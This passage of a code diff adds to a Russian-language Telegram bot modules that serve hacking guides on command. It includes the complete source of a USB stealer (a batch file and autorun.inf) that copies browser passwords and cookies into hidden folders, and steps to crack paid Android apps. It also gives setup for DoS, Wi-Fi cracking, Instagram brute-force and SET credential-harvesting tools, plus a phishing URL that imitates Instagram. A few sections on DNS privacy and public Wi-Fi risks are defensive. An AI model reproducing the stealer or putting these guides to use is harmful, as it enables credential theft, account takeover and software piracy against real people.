+        "Jadx": "https://github.com/skylot/jadx/releases/download/v0.6.0/jadx-0.6.0.zip",
+        "Backsmali": "https://bitbucket.org/JesusFreke/smali/downloads/baksmali-2.1.3.jar",
+        "Sign": "https://github.com/appium/sign/raw/master/dist/sign.jar"
+    }
+    
+    ANDROID_CRACK_STEPS = [
+        "1. Установить Java: sudo apt-get install openjdk-7-jdk",
+        "2. Скачать инструменты в ~/Android",
+        "3. Декомпилировать APK: apktool d -r app.apk",
+        "4. Найти нужный метод (например hasPrime) в .smali файлах",
+        "5. Изменить код (const v0, 1 / return v0)",
+        "6. Собрать обратно: apktool b app",
+        "7. Подписать: sign app.apk",
+        "8. Установить модифицированный APK"
+    ]
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 4. USB СТИЛЛЕР
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    USB_STEALER_CONTENT = """@echo off
+md %~d0\\Mozilla
+md %~d0\\Opera
+md %~d0\\Google
+CD/D %APPDATA%\\Opera\\Opera\\
+copy /y wand.dat %~d0\\Opera\\
+copy /y cookies.dat %~d0\\Opera\\
+cd %AppData%\\Mozilla\\Firefox\\Profiles\\*.default
+copy /y cookies.sqlite %~d0\\Mozilla
+copy /y key3.db %~d0\\Mozilla
+copy /y signons.sqlite %~d0\\Mozilla
+cd %localappdata%\\Google\\Chrome\\User Data\\Default
+copy /y "%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data" "%~d0\\Google"
+ATTRIB -R -A -S -H
+attrib +h %~d0\\Mozilla
+attrib +h %~d0\\Opera
+attrib +h %~d0\\Google"""
+
+    USB_STEALER_AUTORUN = """[AutoRun]
+open="simple.bat"""
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 5. СТАТЬИ И МАНУАЛЫ
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    ARTICLES = {
+        "Взлом Wi-Fi (wifite)": "https://telegra.ph/Vzlom-Wi-Fi-wifite-09-22",
+        "Кастомизация Termux": "https://telegra.ph/Kastomizaciya-Termux-vv1-09-11",
+        "DoS атака (Golden Eye)": "https://telegra.ph/Dos-Ataka-03-18",
+        "Взлом платных приложений Android": "https://telegra.ph/Kak-vzlomat-platnoe-prilozhenie-na-Android-10-05",
+        "Опасность публичного Wi-Fi": "https://telegra.ph/CHem-opasen-publichnyj-Wi-Fi-10-08-2",
+        "Прячем DNS от провайдера": "https://telegra.ph/Pryachem-DNS-ot-glaz-provajdera-10-05",
+        "Создаем USB-стиллер": "https://teletype.in/@darksull/ha2y-LSrn",
+        "Получаем доступ к веб-серверу": "https://telegra.ph/Poluchaem-dostup-k-veb-serveru-ispolzuya-ehtichnyj-haking-07-24",
+        "Взлом iCloud": "https://telegra.ph/Vzlom-ICLOUD-na-iPhoneiPad-01-14",
+        "Telegram в терминале": "https://telegra.ph/Telegram-v-terminale-10-10-2",
+        "Как воруют Telegram каналы": "https://telegra.ph/Kak-voruyut-Telegram-kanaly-08-31",
+        "Metasploit": "https://telegra.ph/Metasploit-03-20",
+        "Этичный хакинг": "https://telegra.ph/EHtichnyj-haking-03-10",
+        "Как обнаружить сниффер в сети": "https://telegra.ph/Kak-obnaruzhit-sniffer-v-svoej-seti-09-29",
+        "Взлом компьютера через Telegram": "https://telegra.ph/Vzlom-kompyutera-cherez-telegramm-02-10",
+        "Безопасный чат в Tor через Termux": "https://telegra.ph/Kak-zapustit-bezopasnyj-chat-v-Tor-cherez-Termux-01-14",
+        "Анонимные банковские карты": "https://telegra.ph/Anonimnye-bankovskie-karty-11-10",
+        "Установка Linux в Termux без root": "https://telegra.ph/Ustanovka-distributivov-Linux-v-Termux-bez-root-11-30",
+        "OSINT на платформе Telegram": "https://telegra.ph/OSINT-na-platforme-Telegram-06-20",
+        "MR ROBOT — Fsociety": "https://telegra.ph/MR-ROBOT-Fsociety-05-25",
+        "Запуск сервера Minecraft в Termux": "https://telegra.ph/Zapusk-servera-minecraft-na-termux-11-30",
+        "Ломаем принтер с телефона": "https://telegra.ph/Lomaem-printer-s-pomoshchyu-telefona-01-08",
+        "Termux от А до Я (часть 1)": "https://telegra.ph/Termux-ot-A-do-YA-CHast-1-02-24",
+        "WPForce — брутфорс WordPress": "https://telegra.ph/WPForce-Bruteforce-i-ehkspluataciya-skomprometirovannyh-WordPress-03-07",
+        "NetHunter Rootless": "https://telegra.ph/NetHunter-Rootless-04-19",
+        "Типичные ошибки ведущие к деанонимизации": "https://telegra.ph/Tipichnye-oshibki-privodyashchie-k-deanonimizacii-04-29",
+        "Кардинг — риски и опасность": "https://telegra.ph/Karding-risk-i-opasnost-05-20",
+        "Обход NAT": "https://telegra.ph/Obhod-NAT-05-22",
+        "HiddenEye — фишинг": "https://telegra.ph/HiddenEye-06-13",
+        "TermGuard — защита терминала": "https://github.com/DarkGa/TermGuard",
+        "Новый метод взлома Instagram (социнженерия)": "https://telegra.ph/Novyj-metod-vzloma-Instagram-c-pomoshchyu-socinzhenerii-06-07",
+        "Как предотвратить DNS атаки": "https://telegra.ph/Kak-predotvratit-DNS-ataki-07-24",
+        "Фишинг ссылка на Instagram": "http://instagram.com.xsph.ru?u="
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # МЕТОДЫ ДЛЯ ГЕНЕРАЦИИ ОТЧЁТОВ
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    @staticmethod
+    def get_wifite_report() -> str:
+        """Отчёт по Wifite2"""
+        lines = []
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         📡 WIFITE2 — ВЗЛОМ WI-FI                                           │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        lines.append(f"│  🔗 GitHub: {TermuxAdvancedTools.WIFITE2_INFO['url']}                                      │")
+        lines.append(f"│  📝 Описание: {TermuxAdvancedTools.WIFITE2_INFO['description']}                                             │")
+        lines.append("│                                                                                                            │")
+        lines.append("│  ⚙️ УСТАНОВКА:                                                                                             │")
+        for line in TermuxAdvancedTools.WIFITE2_INFO['install'].strip().split('\n'):
+            lines.append(f"│     {line:<68} │")
+        lines.append("│                                                                                                            │")
+        lines.append(f"│  🚀 ЗАПУСК: {TermuxAdvancedTools.WIFITE2_INFO['usage']}                                                    │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        return "\n".join(lines)
+    
+    @staticmethod
+    def get_goldeneye_report() -> str:
+        """Отчёт по Golden Eye"""
+        lines = []
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         💀 GOLDEN EYE — DOS АТАКА                                          │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        lines.append(f"│  🔗 GitHub: {TermuxAdvancedTools.GOLDEN_EYE_INFO['url']}                                                 │")
+        lines.append(f"│  📝 Описание: {TermuxAdvancedTools.GOLDEN_EYE_INFO['description']}                                         │")
+        lines.append("│                                                                                                            │")
+        lines.append("│  ⚙️ УСТАНОВКА:                                                                                             │")
+        for line in TermuxAdvancedTools.GOLDEN_EYE_INFO['install'].strip().split('\n'):
+            lines.append(f"│     {line:<68} │")
+        lines.append("│                                                                                                            │")
+        lines.append(f"│  🚀 ЗАПУСК: {TermuxAdvancedTools.GOLDEN_EYE_INFO['usage']}                                                 │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        return "\n".join(lines)
+    
+    @staticmethod
+    def get_android_crack_report() -> str:
+        """Отчёт по взлому Android приложений"""
+        lines = []
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         📱 ВЗЛОМ ПЛАТНЫХ ПРИЛОЖЕНИЙ ANDROID                                 │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        lines.append("│                                                                                                            │")
+        lines.append("│  🔧 ИНСТРУМЕНТЫ:                                                                                           │")
+        for name, url in TermuxAdvancedTools.ANDROID_CRACK_TOOLS.items():
+            lines.append(f"│     • {name}: {url[:60]:<60} │")
+        lines.append("│                                                                                                            │")
+        lines.append("│  ⚙️ ШАГИ:                                                                                                  │")
+        for step in TermuxAdvancedTools.ANDROID_CRACK_STEPS:
+            lines.append(f"│     {step:<68} │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        return "\n".join(lines)
+    
+    @staticmethod
+    def get_usb_stealer_report() -> str:
+        """Отчёт по USB-стиллеру"""
+        lines = []
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         💾 USB СТИЛЛЕР (КРАЖА ПАРОЛЕЙ)                                      │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        lines.append("│                                                                                                            │")
+        lines.append("│  📄 СОДЕРЖИМОЕ simple.bat:                                                                                  │")
+        for line in TermuxAdvancedTools.USB_STEALER_CONTENT.split('\n'):
+            lines.append(f"│     {line:<68} │")
+        lines.append("│                                                                                                            │")
+        lines.append("│  📄 СОДЕРЖИМОЕ autorun.inf:                                                                                │")
+        for line in TermuxAdvancedTools.USB_STEALER_AUTORUN.split('\n'):
+            lines.append(f"│     {line:<68} │")
+        lines.append("│                                                                                                            │")
+        lines.append("│  💡 ПОСЛЕ ПОДКЛЮЧЕНИЯ ФЛЕШКИ:                                                                               │")
+        lines.append("│     • Копируются пароли из Chrome, Firefox, Opera                                                          │")
+        lines.append("│     • Данные сохраняются в скрытые папки на флешке                                                         │")
+        lines.append("│     • Для просмотра используйте WebBrowserPassView                                                        │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        return "\n".join(lines)
+    
+    @staticmethod
+    def get_dns_privacy_report() -> str:
+        """Отчёт по приватности DNS"""
+        lines = []
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         🔒 ПРЯЧЕМ DNS ОТ ПРОВАЙДЕРА                                         │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        lines.append("│                                                                                                            │")
+        lines.append("│  🌐 ШИФРОВАННЫЕ DNS СЕРВИСЫ:                                                                                │")
+        lines.append("│     • Cloudflare (1.1.1.1) — быстрый, без логов                                                            │")
+        lines.append("│     • Google (8.8.8.8) — поддержка DNS over TLS                                                            │")
+        lines.append("│     • Quad9 (9.9.9.9) — блокировка вредоносных доменов                                                     │")
+        lines.append("│     • OpenDNS от Cisco — блокировка взрослого контента                                                     │")
+        lines.append("│                                                                                                            │")
+        lines.append("│  🔧 ПРОТОКОЛЫ ШИФРОВАНИЯ:                                                                                    │")
+        lines.append("│     • DNSCrypt — старейший, порт 443                                                                       │")
+        lines.append("│     • DNS over TLS (DoT) — предлагаемый стандарт IETF                                                     │")
+        lines.append("│     • DNS over HTTPS (DoH) — поддержка от Cloudflare, Google                                               │")
+        lines.append("│                                                                                                            │")
+        lines.append("│  📱 КЛИЕНТЫ:                                                                                               │")
+        lines.append("│     • DNSCrypt Proxy 2 — для Linux/Windows/MacOS                                                           │")
+        lines.append("│     • Simple DNSCrypt — для Windows                                                                        │")
+        lines.append("│     • DNS Cloak — для iOS                                                                                  │")
+        lines.append("│     • Stubby — DNS over TLS клиент                                                                         │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        return "\n".join(lines)
+    
+    @staticmethod
+    def get_public_wifi_dangers() -> str:
+        """Отчёт по опасностям публичного Wi-Fi"""
+        lines = []
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         ⚠️ ОПАСНОСТИ ПУБЛИЧНОГО WI-FI                                       │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        lines.append("│                                                                                                            │")
+        lines.append("│  🔴 ОПАСНОСТЬ №1: ПЕРЕХВАТ ДАННЫХ                                                                           │")
+        lines.append("│     • Злоумышленники перехватывают незашифрованный трафик                                                  │")
+        lines.append("│     • Перехват cookie-файлов (сессий соцсетей)                                                             │")
+        lines.append("│     • Кража логинов/паролей и данных банковских карт                                                       │")
+        lines.append("│     • Инструменты: DroidSheep, Wireshark                                                                   │")
+        lines.append("│                                                                                                            │")
+        lines.append("│  🔴 ОПАСНОСТЬ №2: ФЕЙКОВЫЕ СЕТИ                                                                             │")
+        lines.append("│     • Создание точки доступа с популярным именем (Free Wi-Fi)                                              │")
+        lines.append("│     • Подмена DNS для перенаправления на фишинговые сайты                                                  │")
+        lines.append("│     • Сбор всех логинов/паролей в базу данных                                                              │")
+        lines.append("│                                                                                                            │")
+        lines.append("│  ✅ РЕШЕНИЕ:                                                                                                │")
+        lines.append("│     • Использовать VPN (Cloud VPN, Browsec)                                                                │")
+        lines.append("│     • Настроить домашний VPN на роутере Asus                                                               │")
+        lines.append("│     • Не вводить пароли в открытых сетях                                                                   │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        return "\n".join(lines)
+    
+    @staticmethod
+    def get_ethical_hacking_report() -> str:
+        """Отчёт по этичному хакингу"""
+        lines = []
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         🔐 ЭТИЧНЫЙ ХАКИНГ (PENETRATION TESTING)                            │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        lines.append("│                                                                                                            │")
+        lines.append("│  🔍 ИНСТРУМЕНТЫ ДЛЯ СБОРА ИНФОРМАЦИИ:                                                                       │")
+        lines.append("│     • HTTrack — скачивание сайтов для анализа                                                              │")
+        lines.append("│     • Maltego — анализ ссылок и данных                                                                     │")
+        lines.append("│     • Nessus — сканер уязвимостей                                                                          │")
+        lines.append("│     • Netsparker — сканирование сайтов и приложений                                                        │")
+        lines.append("│     • Nikto — поиск опасных файлов и CGI-сценариев                                                         │")
+        lines.append("│     • ScanMyServer — онлайн сканирование уязвимостей                                                       │")
+        lines.append("│                                                                                                            │")
+        lines.append("│  🚨 ТОП-10 УЯЗВИМОСТЕЙ OWASP:                                                                               │")
+        lines.append("│     1. Инъекции (SQL, команды)                                                                             │")
+        lines.append("│     2. Неправомерная аутентификация                                                                        │")
+        lines.append("│     3. Раскрытие конфиденциальных данных                                                                   │")
+        lines.append("│     4. Внешние XML-сущности (XXE)                                                                          │")
+        lines.append("│     5. Неправомерный доступ (неправильные права)                                                           │")
+        lines.append("│     6. Ошибки в конфигурации безопасности                                                                  │")
+        lines.append("│     7. Межсайтовый скриптинг (XSS)                                                                          │")
+        lines.append("│     8. Небезопасная десериализация                                                                         │")
+        lines.append("│     9. Использование компонентов с известными уязвимостями                                                 │")
+        lines.append("│    10. Неудовлетворительное журналирование                                                                 │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        return "\n".join(lines)
+    
+    @staticmethod
+    def get_articles_report() -> str:
+        """Отчёт со всеми статьями"""
+        lines = []
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         📚 СТАТЬИ И МАНУАЛЫ                                                │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        for name, url in TermuxAdvancedTools.ARTICLES.items():
+            lines.append(f"│  • {name[:50]:<50} → {url[:40]:<40} │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        return "\n".join(lines)
+    
+    @staticmethod
+    def generate_full_report() -> str:
+        """Генерирует полный отчёт"""
+        parts = [
+            TermuxAdvancedTools.get_wifite_report(),
+            TermuxAdvancedTools.get_goldeneye_report(),
+            TermuxAdvancedTools.get_android_crack_report(),
+            TermuxAdvancedTools.get_usb_stealer_report(),
+            TermuxAdvancedTools.get_dns_privacy_report(),
+            TermuxAdvancedTools.get_public_wifi_dangers(),
+            TermuxAdvancedTools.get_ethical_hacking_report(),
+            TermuxAdvancedTools.get_articles_report(),
+        ]
+        
+        lines = []
+        lines.append("╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
+        lines.append("│                         🔥 TERMUX RUS — ПРОДВИНУТЫЕ ИНСТРУМЕНТЫ 🔥                                            │")
+        lines.append("╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣")
+        lines.append(f"│  📅 АКТУАЛЬНО НА: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<50} ║")
+        lines.append("╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣")
+        lines.append("")
+        
+        for part in parts:
+            lines.append(part)
+            lines.append("")
+        
+        lines.append("╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
+        lines.append(f"│  📚 Всего статей: {len(TermuxAdvancedTools.ARTICLES)}                                                              │")
+        lines.append("│  🚀 REPORT GENERATED SUCCESSFULLY                                                                           │")
+        lines.append("╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
+        
+        return "\n".join(lines)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# НОВЫЕ КОМАНДЫ ДЛЯ БОТА
+# ═══════════════════════════════════════════════════════════════════════════════
+
+@bot.message_handler(commands=['wifi', 'wifite'])
+def wifite_command(message):
+    """Wifite2 инструкция"""
+    report = TermuxAdvancedTools.get_wifite_report()
+    bot.send_message(message.chat.id, report)
+
+
+@bot.message_handler(commands=['goldeneye', 'dos'])
+def goldeneye_command(message):
+    """Golden Eye инструкция"""
+    report = TermuxAdvancedTools.get_goldeneye_report()
+    bot.send_message(message.chat.id, report)
+
+
+@bot.message_handler(commands=['androidcrack', 'взломприложений'])
+def android_crack_command(message):
+    """Взлом Android приложений"""
+    report = TermuxAdvancedTools.get_android_crack_report()
+    bot.send_message(message.chat.id, report)
+
+
+@bot.message_handler(commands=['usbstealer', 'стиллер'])
+def usb_stealer_command(message):
+    """USB стиллер инструкция"""
+    report = TermuxAdvancedTools.get_usb_stealer_report()
+    bot.send_message(message.chat.id, report)
+
+
+@bot.message_handler(commands=['dnsprivacy', 'прячемdns'])
+def dns_privacy_command(message):
+    """Приватность DNS"""
+    report = TermuxAdvancedTools.get_dns_privacy_report()
+    bot.send_message(message.chat.id, report)
+
+
+@bot.message_handler(commands=['publicwifi', 'wifiопасность'])
+def public_wifi_command(message):
+    """Опасности публичного Wi-Fi"""
+    report = TermuxAdvancedTools.get_public_wifi_dangers()
+    bot.send_message(message.chat.id, report)
+
+
+@bot.message_handler(commands=['ethhack', 'этичныйхакинг'])
+def ethical_hacking_command(message):
+    """Этичный хакинг"""
+    report = TermuxAdvancedTools.get_ethical_hacking_report()
+    bot.send_message(message.chat.id, report)
+
+
+@bot.message_handler(commands=['termuxadvanced', 'termuxpro'])
+def termux_advanced_command(message):
+    """Продвинутые Termux инструменты"""
+    report = TermuxAdvancedTools.generate_full_report()
+    
+    if len(report) > 4000:
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as f:
+            f.write(report)
+            f.flush()
+            with open(f.name, 'rb') as doc:
+                bot.send_document(message.chat.id, doc, caption=f"📄 ПРОДВИНУТЫЕ TERMUX ИНСТРУМЕНТЫ")
+            os.unlink(f.name)
+    else:
+        bot.send_message(message.chat.id, report)
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# БЛОК 25: ПОИСК ПО НИКНЕЙМУ, IPGEOLOCATION, INSTASHELL, SET (ФИШИНГ)
+# Автор: TERMUX RUS
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class TermuxOsintTools:
+    """OSINT инструменты для Termux: поиск по нику, геолокация, брутфорс, фишинг"""
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 1. ПОИСК ПО НИКНЕЙМУ (USER RECON)
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    USER_RECON_INFO = {
+        "name": "UserRecon",
+        "url": "https://github.com/issamelferkh/userrecon",
+        "description": "Поиск аккаунтов по никнейму в 75+ социальных сетях",
+        "install": """
+apt update
+apt upgrade
+apt install git
+apt install curl
+git clone https://github.com/issamelferkh/userrecon
+cd userrecon
+chmod +x userrecon.sh
+""",
+        "usage": "./userrecon.sh"
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 2. IPGEOLOCATION — ОПРЕДЕЛЕНИЕ IP
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    IP_GEOLOCATION_INFO = {
+        "name": "IPGeoLocation",
+        "url": "https://github.com/maldevel/IPGeoLocation",
+        "description": "Определение геолокации, провайдера, страны по IP-адресу",
+        "install": """
+pkg install python -y
+pkg install python2 -y
+apt update
+apt upgrade
+pkg install git
+git clone https://github.com/maldevel/IPGeoLocation
+cd IPGeoLocation
+chmod +x ipgeolocation.py
+pip3 install -r requirements.txt
+""",
+        "usage": "python ipgeolocation.py -t 192.168.1.1\npython ipgeolocation.py -t example.com"
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 3. INSTASHELL — БРУТФОРС INSTAGRAM
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    INSTASHELL_INFO = {
+        "name": "Instashell",
+        "url": "https://github.com/thelinuxchoice/instashell",
+        "description": "Брутфорс Instagram аккаунтов через Tor",
+        "install": """
+apt update
+apt install tor
+service tor start
+git clone https://github.com/thelinuxchoice/instashell
+cd instashell
+chmod +x instashell.sh
+""",
+        "usage": "./instashell.sh"
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 4. СЛОВАРЬ ПАРОЛЕЙ (PWNED PASSWORDS)
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    PWNED_PASSWORDS_INFO = {
+        "name": "Pwned Passwords",
+        "url": "https://downloads.pwnedpasswords.com/passwords/pwned-passwords-1.0.txt.7z",
+        "description": "База слитых паролей (300+ млн записей)",
+        "size": "~5 GB в распакованном виде",
+        "usage": "Используйте для брутфорса и проверки паролей"
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 5. SOCIAL ENGINEERING TOOLKIT (SET) — ФИШИНГ
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    SET_INFO = {
+        "name": "Social Engineering Toolkit (SET)",
+        "description": "Мощный инструмент для фишинга и социальной инженерии",
+        "install_via_katoolin": """
+git clone https://github.com/LionSec/katoolin.git
+cp katoolin/katoolin.py /usr/bin/katoolin
+chmod +x /usr/bin/katoolin
+katoolin
+# Выбрать 1 (Add kali repositories & Update)
+# Выбрать 1 (Add kali repositories)
+apt install set
+""",
+        "usage_setoolkit": """
+setoolkit
+1 (Social-Engineering Attacks)
+2 (Website Attack Vectors)
+3 (Credential Harvester Attack Method)
+2 (Site Cloner)
+# Ввести свой IP
+# Ввести URL для клонирования
+""",
+        "warning": "После использования удалите репозитории Kali: katoolin → 1 → 3"
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 6. ДОПОЛНИТЕЛЬНЫЕ ССЫЛКИ
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    ADDITIONAL_LINKS = {
+        "Ломаем Wi-Fi как семечки": "https://telegra.ph/Lomaem-WiFi-kak-semechki-05-28",
+        "Найти любого человека по телефону": "https://telegra.ph/Najti-lyubogo-cheloveka-imeyushchego-telefon-05-11",
+        "full": "https://telegra.ph/full-05-14",
+        "Собираем всю инфу о человеке": "https://telegra.ph/Sobiraem-vsyu-vozmozhnuyu-infu-o-cheloveke-08-25",
+        "full (2)": "https://telegra.ph/full-09-10",
+        "SMS спам через Termux": "https://telegra.ph/SMS-spam-cherez-Termux-07-13",
+        "full (3)": "https://telegra.ph/full-09-17",
+        "Заработок от 500 в неделю": "https://telegra.ph/Zarabotok-ot-500-v-nedelyu-09-10",
+        "Как распространяются вирусы": "https://telegra.ph/Kak-rasprostranyayutsya-virusy-03-12"
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # МЕТОДЫ ДЛЯ ГЕНЕРАЦИИ ОТЧЁТОВ
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    @staticmethod
+    def get_userrecon_report() -> str:
+        """Отчёт по UserRecon"""
+        lines = []
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         👤 ПОИСК ПО НИКНЕЙМУ (USER RECON)                                 │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        lines.append(f"│  🔗 GitHub: {TermuxOsintTools.USER_RECON_INFO['url']}                                    │")
+        lines.append(f"│  📝 Описание: {TermuxOsintTools.USER_RECON_INFO['description']}                                             │")
+        lines.append("│                                                                                                            │")
+        lines.append("│  ⚙️ УСТАНОВКА:                                                                                             │")
+        for line in TermuxOsintTools.USER_RECON_INFO['install'].strip().split('\n'):
+            lines.append(f"│     {line:<68} │")
+        lines.append("│                                                                                                            │")
+        lines.append(f"│  🚀 ЗАПУСК: {TermuxOsintTools.USER_RECON_INFO['usage']}                                                    │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        return "\n".join(lines)
+    
+    @staticmethod
+    def get_ipgeolocation_report() -> str:
+        """Отчёт по IPGeoLocation"""
+        lines = []
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         🌍 IPGEOLOCATION — ОПРЕДЕЛЕНИЕ IP                                 │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        lines.append(f"│  🔗 GitHub: {TermuxOsintTools.IP_GEOLOCATION_INFO['url']}                                   │")
+        lines.append(f"│  📝 Описание: {TermuxOsintTools.IP_GEOLOCATION_INFO['description']}                                        │")
+        lines.append("│                                                                                                            │")
+        lines.append("│  ⚙️ УСТАНОВКА:                                                                                             │")
+        for line in TermuxOsintTools.IP_GEOLOCATION_INFO['install'].strip().split('\n'):
+            lines.append(f"│     {line:<68} │")
+        lines.append("│                                                                                                            │")
+        lines.append(f"│  🚀 ЗАПУСК: {TermuxOsintTools.IP_GEOLOCATION_INFO['usage']}                                                │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        return "\n".join(lines)
+    
+    @staticmethod
+    def get_instashell_report() -> str:
+        """Отчёт по Instashell"""
+        lines = []
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         📸 INSTASHELL — БРУТФОРС INSTAGRAM                                 │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        lines.append(f"│  🔗 GitHub: {TermuxOsintTools.INSTASHELL_INFO['url']}                                      │")
+        lines.append(f"│  📝 Описание: {TermuxOsintTools.INSTASHELL_INFO['description']}                                            │")
+        lines.append("│                                                                                                            │")
+        lines.append("│  ⚙️ УСТАНОВКА:                                                                                             │")
+        for line in TermuxOsintTools.INSTASHELL_INFO['install'].strip().split('\n'):
+            lines.append(f"│     {line:<68} │")
+        lines.append("│                                                                                                            │")
+        lines.append(f"│  🚀 ЗАПУСК: {TermuxOsintTools.INSTASHELL_INFO['usage']}                                                   │")
+        lines.append("│                                                                                                            │")
+        lines.append("│  📥 СЛОВАРЬ ПАРОЛЕЙ (300+ млн):                                                                            │")
+        lines.append(f"│     {TermuxOsintTools.PWNED_PASSWORDS_INFO['url'][:65]:<65} │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        return "\n".join(lines)
+    
+    @staticmethod
+    def get_set_report() -> str:
+        """Отчёт по Social Engineering Toolkit"""
+        lines = []
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         🎣 SOCIAL ENGINEERING TOOLKIT (SET)                               │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        lines.append(f"│  📝 Описание: {TermuxOsintTools.SET_INFO['description']}                                                   │")
+        lines.append("│                                                                                                            │")
+        lines.append("│  ⚙️ УСТАНОВКА ЧЕРЕЗ KATOOLIN:                                                                              │")
+        for line in TermuxOsintTools.SET_INFO['install_via_katoolin'].strip().split('\n'):
+            lines.append(f"│     {line:<68} │")
+        lines.append("│                                                                                                            │")
+        lines.append("│  🚀 ЗАПУСК SETOOLKIT:                                                                                      │")
+        for line in TermuxOsintTools.SET_INFO['usage_setoolkit'].strip().split('\n'):
+            lines.append(f"│     {line:<68} │")
+        lines.append("│                                                                                                            │")
+        lines.append("│  ⚠️ ВАЖНО: После использования удалите репозитории Kali: katoolin → 1 → 3                                 │")
+        lines.append("│  ⚠️ Очистите ненужные пакеты: apt autoremove / apt autoclean                                               │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        return "\n".join(lines)
+    
+    @staticmethod
+    def get_additional_links() -> str:
+        """Дополнительные ссылки"""
+        lines = []
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         📚 ДОПОЛНИТЕЛЬНЫЕ МАТЕРИАЛЫ                                        │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        for name, url in TermuxOsintTools.ADDITIONAL_LINKS.items():
+            lines.append(f"│  • {name[:50]:<50} → {url[:45]:<45} │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        return "\n".join(lines)
+    
+    @staticmethod
+    def generate_full_report() -> str:
+        """Генерирует полный отчёт"""
+        parts = [
+            TermuxOsintTools.get_userrecon_report(),
+            TermuxOsintTools.get_ipgeolocation_report(),
+            TermuxOsintTools.get_instashell_report(),
+            TermuxOsintTools.get_set_report(),
+            TermuxOsintTools.get_additional_links(),
+        ]
+        
+        lines = []
+        lines.append("╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
+        lines.append("│                         🔥 TERMUX RUS — OSINT, БРУТФОРС, ФИШИНГ 🔥                                           │")
